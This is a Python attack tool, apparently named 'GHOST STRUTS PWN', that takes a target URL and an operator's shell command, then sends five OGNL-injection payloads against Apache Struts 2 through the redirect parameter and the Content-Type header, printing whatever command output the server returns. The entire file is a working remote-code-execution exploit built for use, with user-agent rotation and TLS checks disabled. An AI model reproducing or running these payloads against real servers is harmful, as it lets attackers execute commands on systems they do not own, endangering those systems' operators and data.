#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import sys
import urllib3
import os
import random
import argparse
import time

banner1 = '''
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗███████╗████████╗██████╗ ██╗   ██╗████████╗███████╗
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔════╝╚══██╔══╝██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██║  ███╗███████║██║   ██║███████╗   ██║   ███████╗   ██║   ██████╔╝██║   ██║   ██║   ███████╗
██║   ██║██╔══██║██║   ██║╚════██║   ██║   ╚════██║   ██║   ██╔══██╗██║   ██║   ██║   ╚════██║
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ███████║   ██║   ██║  ██║╚██████╔╝   ██║   ███████║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
                                                                                              
    '''

banner2 = '''
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X
X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X
 X# \.X        @#%,.@                  @#%,.@        X./  #
  ##  X          @#%,.@              @#%,.@          X   #
, "# #X            @#%,.@          @#%,.@            X ##
   `###X             @#%,.@      @#%,.@             ####'
  . ' ###              @#%.,@  @#%,.@              ###`"
    . ";"                @#%.@#%,.@                ;"` ' .
      '                    @#%,.@                   ,.
      ` ,                @#%,.@  @@                `
                          @@@  @@@  
GHOST STRUTS PWN
'''

bannerselect = [banner1, banner2]
banner = random.choice(bannerselect)


parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument('-u', action= 'store', dest= 'url',
                           default= '', required= True,
                           help= 'URL A ser injetada')

arguments = parser.parse_args()

useragents1 = open("user-agents.txt","r")

for linha in useragents1:
    valores = linha.split("\n")

#site-argument------------------------------------------------
site = arguments.url

#user-agent---------------------------------------------------
useduser = random.choice(valores)
useragent = {"User-Agent": useduser}
print(useragent)
#EXPLOIT-1
def exploitone(cmd):
    one = site + "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','"

    end = "'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
    pwn = requests.get(one + cmd + end, headers=useragent, verify=False)
    if pwn.status_code == 400 or "<html>" in pwn.text:
        print('\033[1;31m[-]' + ' \033[1;30mNOT VULNERABLE')
    else:
        print('\033[1;32m' + pwn.text)

def exploittwo(cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(@java.lang.Runtime@getRuntime().exec('{}'))".format(cmd)
    payload += "}"

    headers = {"User-Agent": useduser,
               'Content-Type': payload}
    pwn = requests.get(site, headers=headers, verify=False)
    if pwn.status_code == 400 or "<html>" and "</html>" in pwn.text:
        print('\033[1;31m[-]' + ' \033[1;30mNOT VULNERABLE')
    else:
        print('\033[1;32m' + pwn.text)


def exploitthree(cmd):
    payload = "~multipart/form-data%{"
    payload += "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
    payload += "@java.lang.Runtime@getRuntime().exec('{}')".format(cmd)
    payload += "}"

    headers = {"User-Agent": useduser,
               'Content-Type': payload}
    pwn = requests.get(site, headers=headers, verify=False)
    if pwn.status_code == 400 or "<html>" and "</html>" in pwn.text:
        print('\033[1;31m[-]' + ' \033[1;30mNOT VULNERABLE')
    else:
        print('\033[1;32m' + pwn.text)


def exploitfour(cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    headers = {"User-Agent": useduser,
               'Content-Type': payload}
    pwn = requests.get(site, headers=headers, verify=False)
    if pwn.status_code == 400 or "<html>" and "</html>" in pwn.text:
        print('\033[1;31m[-]' + ' \033[1;30mNOT VULNERABLE')
    else:
        print('\033[1;32m' + pwn.text)

def exploitfive(cmd):
    payload = "%{"
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(@java.lang.Runtime@getRuntime().exec('%s'))" % cmd
    payload += "}"

    headers = {"User-Agent": useduser,
               'Content-Type': payload}
    pwn = requests.get(site, headers=headers, verify=False)
    if pwn.status_code == 404 or "<html>" and "</html>" in pwn.text:
        print('\033[1;31m[-]' + ' \033[1;30mNOT VULNERABLE')
    else:
        print(pwn.text)

os.system("cls || clear")


while 1==1:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    print("\033[1;35m" + banner + "\033[1;36m")
    print("\n╔──────¤◎¤──────╗\n\nUSER-AGENT = " + useduser + "\nSITE = " + site + "\nPAYLOAD'S = 5" + "\n\n╚──────¤◎¤──────╝\n")
    print("\n╭━─━─━─≪✠≫─━─━─━╮\n\nCoded by: Clust3r\nGr33tz: Kosuleet, K4PP4K\n\n╰━─━─━─≪✠≫─━─━─━╯\n")
    comando = input("\033[1;35mroot@GHOST ~ ")
    print("\n\033[1;37m[!] \033[1;91mTESTANDO PAYLOAD 1...")
    time.sleep(2)
    try:
        exploitone(comando)
    except Exception as error:
        print("[-] ERROR/\033[;1mNOT VULNERABLE")
    time.sleep(1)
    print("\033[1;37m[!] \033[1;91mTESTANDO PAYLOAD 2...")
    time.sleep(2)
    try:
        exploittwo(comando)
    except Exception as error:
        print("[-] ERROR/\033[;1mNOT VULNERABLE")
    time.sleep(1)
    print("\033[1;37m[!] \033[1;91mTESTANDO PAYLOAD 3...")
    time.sleep(2)
    try:
        exploitthree(comando)
    except Exception as error:
        print("[-] ERROR/\033[;1mNOT VULNERABLE")
    time.sleep(1)
    print("\033[1;37m[!] \033[1;91mTESTANDO PAYLOAD 4...")
    time.sleep(2)
    try:
        exploitfour(comando)
    except Exception as error:
        print("[-] ERROR/\033[;1mNOT VULNERABLE")
    time.sleep(1)
    print("\033[1;37m[!] \033[1;91mTESTANDO PAYLOAD 5...")
    time.sleep(2)
    try:
        exploitfive(comando)
    except Exception as error:
        print("[-] ERROR/\033[;1mNOT VULNERABLE")
    time.sleep(1)